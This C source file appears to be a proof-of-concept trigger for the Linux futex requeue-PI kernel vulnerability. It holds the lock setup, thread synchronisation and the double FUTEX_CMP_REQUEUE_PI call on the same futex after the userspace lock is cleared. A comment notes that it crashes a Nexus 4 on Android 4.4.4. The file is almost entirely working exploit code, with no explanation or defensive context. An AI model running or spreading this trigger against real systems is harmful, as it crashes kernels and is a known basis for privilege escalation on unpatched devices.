#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/types.h>


#define USERLOCK_FREE 		0
#define USERLOCK_OCCUPIED 	1
#define FUTEX_WAIT_REQUEUE_PI 	11
#define FUTEX_CMP_REQUEUE_PI	12


/*
can cause nexus4 4.4.4 crash
*/
static void inline forever()
{
	while(1){
		sleep(1);	
	}
}

inline void userlock_wait(volatile const int *userlock)
{
//	printf("user lock wait\n");
	while (USERLOCK_OCCUPIED == * userlock)
	{
		usleep(10);
	}
}

inline void userlock_lock(volatile int *userlock)
{
//	printf("user lock\n");
	*userlock = USERLOCK_OCCUPIED;
}

inline void userlock_release(volatile int *userlock)
{
//	printf("user release\n");
	*userlock = USERLOCK_FREE;
}

int get_voluntary_ctxt_switches(pid_t tid)
{
	FILE *fp;
	char proc_path[256];
	char buf[0x1000];
	char *ptr = buf;
	int count = -1;

	snprintf(proc_path,sizeof(proc_path),"/proc/self/task/%d/status",tid);

	fp = fopen(proc_path,"rb");

	if (fp != NULL){
		fread(buf,sizeof(unsigned char),sizeof(buf),fp);
		ptr = strstr(buf,"voluntary_ctxt_switches:");
		ptr += strlen("voluntary_ctxt_switches:");
		count = atoi(ptr);
		fclose(fp);
	}
	
	//printf("voluntary_ctxt_switches:%d\n",count);	

	return count;
}

void wait_for_thread_to_wait_in_kernel(pthread_t tid,int context_switch_count)
{
	//printf("switch count :%d\n",context_switch_count);
	while(get_voluntary_ctxt_switches(tid) <= context_switch_count)
	{
		usleep(10);
	}
}

inline int futex_lock_pi(int *uaddr)
{
	long ret;
	ret = syscall(__NR_futex,uaddr,FUTEX_LOCK_PI,0,NULL,NULL,0);
	
	if (ret < 0)
	{
		printf("futex_lock_pi,%ld\n",ret);
	}
	return ret;
}

inline int futex_unlock_pi(int *uaddr)
{
	long ret;
	ret = syscall(__NR_futex,uaddr,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
	
	if (ret < 0)
	{
		printf("futex_unlock_pi,%ld\n",ret);
	}
	return ret;
}

inline int futex_wait_requeue_pi(int *uaddr1,int *uaddr2)
{
	long ret;
	
	ret =syscall(__NR_futex,uaddr1,FUTEX_WAIT_REQUEUE_PI,0,NULL,uaddr2,0);

	if (ret < 0)
	{
		printf("futext_cmp_requeue_pi,%ld\n",ret);
	}

	return ret;
}

inline int futex_requeue_pi(int *uaddr1,int *uaddr2,int cmpval)
{
	long ret;
	ret = syscall(__NR_futex,uaddr1,FUTEX_CMP_REQUEUE_PI,1,NULL,uaddr2,cmpval);
	if (ret < 0)
	{
		printf("futex_cmp_requeue_pi,%ld\n",ret);
	}

	return ret;
}

int inline futex_wakeup(int *uaddr,int cmpval)
{
	long ret;
	ret = syscall(__NR_futex,uaddr,FUTEX_UNLOCK_PI,100,NULL,NULL,cmpval);
	if (ret < 0)
	{
		printf("futex_wakeup,%ld\n",ret);
	}

	return ret;
}

int A = 0,B = 0;
volatile int invoke_futex_wait_requeue_pi = 0;
volatile int thread_tid = -1;

void *thread(void *arg)
{	
	
	thread_tid = syscall(__NR_gettid);
	printf("---thread tid:%x\n",thread_tid);
	userlock_wait(&invoke_futex_wait_requeue_pi);
	printf("---userlock_wait unlock\n");	
	futex_wait_requeue_pi(&A,&B);
	printf("---Someone woke me up\n");
	printf("---thread A=%x,B=%x\n",A,B);
	
	
//	forever();	
}

int main(int argc,char *argv[])
{
	pthread_t t;
	int context_switch_count = 0;
	
	int tid = syscall(__NR_gettid);
	printf("A=%p,B=%p\n",&A,&B);
	printf("[1],tid:%x\n",tid);
	futex_lock_pi(&B);
	printf("B lock:%x\n",B);
	userlock_lock(&invoke_futex_wait_requeue_pi);
	pthread_create(&t,NULL,thread,NULL);
	
	/*Wait for the thread to be in a system call*/
	while(thread_tid < 0)
	{
		usleep(10);
	}

	context_switch_count = get_voluntary_ctxt_switches(thread_tid);
	userlock_release(&invoke_futex_wait_requeue_pi);
	
	wait_for_thread_to_wait_in_kernel(thread_tid,context_switch_count);

	printf("before A,B,A=%x,B=%x\n",A,B);	
	futex_requeue_pi(&A,&B,A);
	printf("A,B,A=%x,B=%x\n",A,B);

	B = 0; //hole use
	//futex_unlock_pi(&B);	
	sleep(2);	

	futex_requeue_pi(&B,&B,B);
	printf("B,B,A=%x,B=%x\n",A,B);
//	forever();

	pthread_join(t,NULL);	
	return 0;
}



























